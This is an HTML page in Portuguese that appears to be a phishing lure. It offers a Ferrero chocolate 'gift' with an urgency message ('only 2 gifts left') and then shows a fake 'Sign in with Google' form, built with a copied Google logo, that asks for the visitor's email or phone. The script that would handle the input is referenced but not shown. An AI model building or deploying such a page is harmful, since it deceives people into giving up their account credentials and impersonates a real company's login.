<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Presente</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Imagem Ferrero centralizada -->
        <img src="img/ferrero.png" alt="Ferrero" class="ferrero-image">

        <p class="message">Restam apenas<br>2 presentes!</p>
        <p id="sub-message" class="sub-message">Logue para ganhar:</p>
        <button id="google-button" class="google-button" onclick="showLoginForm()">
            <span class="google-logo">
                <!-- SVG do logo do Google -->
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 48 48">
                    <path fill="#4285F4" d="M24 9.5c3.32 0 6.29 1.15 8.63 3.07l6.43-6.43C34.86 2.41 29.7 0 24 0 14.64 0 6.82 5.43 3.42 13.33l7.46 5.8C12.81 13.04 17.97 9.5 24 9.5z"></path>
                    <path fill="#34A853" d="M46.05 24.53c0-1.61-.14-3.15-.41-4.64H24v9.04h12.5c-.54 2.79-2.06 5.14-4.35 6.75l7.32 5.69C43.52 37.65 46.05 31.51 46.05 24.53z"></path>
                    <path fill="#FBBC05" d="M10.88 28.13a14.63 14.63 0 0 1-.76-4.63c0-1.61.28-3.16.76-4.63l-7.46-5.8C1.26 16.94 0 20.36 0 24c0 3.64 1.26 7.06 3.42 9.93l7.46-5.8z"></path>
                    <path fill="#EA4335" d="M24 48c5.7 0 10.86-1.9 14.48-5.17l-7.32-5.69C28.33 38.83 26.26 39.5 24 39.5c-6.03 0-11.19-3.54-13.12-8.83l-7.46 5.8C6.82 42.57 14.64 48 24 48z"></path>
                </svg>
            </span>
            Sign in with Google
        </button>
        
        <!-- FormulÃ¡rio de login, escondido inicialmente -->
        <div id="loginForm" class="login-form">
            <h2>Sign in</h2>
            <p>with your Google Account</p>
            <input type="email" placeholder="Email or phone">
            <a href="#">Forgot email?</a>
            <button class="next-button" onclick="showPopup()">Next</button>
            <p><a href="#">Create account</a></p>
        </div>
		<p id="senha" class="senha" >Sua Senha: 951264</p>
    </div>

    <script src="script.js"></script>
</body>
</html>
